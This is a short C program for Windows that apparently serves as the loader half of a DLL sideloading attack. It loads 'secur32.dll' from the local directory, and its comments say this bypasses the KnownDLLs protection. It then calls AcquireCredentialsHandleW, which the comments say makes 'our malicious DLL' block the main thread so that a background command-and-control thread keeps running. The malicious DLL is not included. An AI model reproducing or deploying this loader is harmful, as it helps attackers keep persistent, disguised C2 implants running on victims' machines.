#include <windows.h>
#include <stdio.h>

// Signature for AcquireCredentialsHandleW from secur32.dll
typedef LONG (WINAPI *AcquireCredentialsHandleW_t)(
    LPWSTR  pszPrincipal,
    LPWSTR  pszPackage,
    ULONG   fCredentialUse,
    PVOID   pvLogonId,
    PVOID   pAuthData,
    PVOID   pGetKeyFn,
    PVOID   pvGetKeyArgument,
    PVOID   phCredential,
    PVOID   ptsExpiry
);

int main()
{
    HMODULE hLib = NULL;
    AcquireCredentialsHandleW_t pAcquireCredentialsHandleW = NULL;

    // Use a relative path to force the loader to look in the local directory first,
    // bypassing the KnownDLLs check for secur32.dll.
    hLib = LoadLibraryW(L".\\secur32.dll");

    if (hLib != NULL)
    {
        // Resolve AcquireCredentialsHandleW - our custom DLL will block here indefinitely
        pAcquireCredentialsHandleW = (AcquireCredentialsHandleW_t)GetProcAddress(hLib, "AcquireCredentialsHandleW");

        if (pAcquireCredentialsHandleW != NULL)
        {
            // Call the function - our malicious DLL blocks the main thread here,
            // keeping the process alive while the background C2 thread runs.
            pAcquireCredentialsHandleW(
                NULL, NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL
            );
        }

        FreeLibrary(hLib);
    }

    return 0;
}
